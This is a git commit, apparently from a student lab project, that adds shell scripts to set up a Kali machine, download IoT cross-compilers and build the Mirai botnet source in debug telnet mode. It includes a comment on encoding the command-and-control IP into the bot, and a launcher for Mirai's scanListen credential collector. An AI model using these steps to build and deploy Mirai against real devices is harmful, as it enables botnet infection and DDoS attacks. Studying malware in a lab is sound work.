60f6acec45cf8429cfa5cea92cabc464c6481222
Simone <dibiasio.1823213@studenti.uniroma1.it>
2020-10-19 14:36:26 -0400

    initial setup and scanListen launcher added

---
+++ 00_setup.sh
@@ -0,0 +1,99 @@
+#!/bin/bash
+
+# setting path to Mirai source Folder
+pathToMirai=/home/kali/Desktop/MiraiRepository/mirai/MiraiSourceCode
+export pathToMirai
+
+echo FASE 1
+echo -------------------------------------------------------
+
+apt update -y
+apt upgrade -y
+ 
+apt-get install gcc golang electric-fence sudo git -y
+apt-get install mysql-server mysql-client -y
+
+clear
+echo FASE 2
+echo -------------------------------------------------------
+
+mkdir /etc/xcompile
+cd /etc/xcompile
+
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2
+wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
+wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2
+
+tar -jxf cross-compiler-armv4l.tar.bz2
+tar -jxf cross-compiler-armv5l.tar.bz2
+tar -jxf cross-compiler-armv6l.tar.bz2
+tar -jxf cross-compiler-armv7l.tar.bz2
+tar -jxf cross-compiler-i586.tar.bz2
+tar -jxf cross-compiler-i686.tar.bz2
+tar -jxf cross-compiler-m68k.tar.bz2
+tar -jxf cross-compiler-mips.tar.bz2
+tar -jxf cross-compiler-mipsel.tar.bz2
+tar -jxf cross-compiler-powerpc.tar.bz2
+tar -jxf cross-compiler-sh4.tar.bz2
+tar -jxf cross-compiler-sparc.tar.bz2
+tar -jxf cross-compiler-x86_64.tar.bz2
+
+
+rm *.tar.bz2
+mv cross-compiler-armv4l armv4l
+mv cross-compiler-armv5l armv5l
+mv cross-compiler-armv6l armv6l
+mv cross-compiler-armv7l armv7l
+mv cross-compiler-i586 i586
+mv cross-compiler-i686 i686
+mv cross-compiler-m68k m68k
+mv cross-compiler-mips mips
+mv cross-compiler-mipsel mipsel
+mv cross-compiler-powerpc powerpc
+mv cross-compiler-sh4 sh4
+mv cross-compiler-sparc sparc
+mv cross-compiler-x86_64 x86_64
+
+clear
+echo FASE 3
+echo -------------------------------------------------------
+
+echo $PATH
+export PATH=$PATH:/etc/xcompile/armv4l/bin
+export PATH=$PATH:/etc/xcompile/armv6l/bin
+export PATH=$PATH:/etc/xcompile/armv7l/bin
+export PATH=$PATH:/etc/xcompile/i586/bin
+export PATH=$PATH:/etc/xcompile/m68k/bin
+export PATH=$PATH:/etc/xcompile/mips/bin
+export PATH=$PATH:/etc/xcompile/mipsel/bin
+export PATH=$PATH:/etc/xcompile/powerpc/bin
+export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
+export PATH=$PATH:/etc/xcompile/sh4/bin
+export PATH=$PATH:/etc/xcompile/sparc/bin
+export PATH=$PATH:/etc/xcompile/armv6l/bin
+ 
+export PATH=$PATH:/usr/local/go/bin
+export GOPATH=$HOME/go
+
+# Controllo sulla variabile path
+echo $PATH
+
+# to fix errors with mysql drivers
+go get github.com/go-sql-driver/mysql
+go get github.com/mattn/go-shellwords
+
+# /mirai/debug/enc ip 192.168.1.9 # cnc ip address
+# sostituire la stringa criptata ottenuta in /mirai/bot/table.c
+
+cd $pathToMirai/mirai
+./build.sh debug telnet
---
+++ 03_launchScanListen.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+# setting path to Mirai source Folder
+pathToMirai=/home/kali/Desktop/MiraiRepository/mirai/MiraiSourceCode
+export pathToMirai
+
+# launching cnc
+$pathToMirai/mirai/debug/scanListen
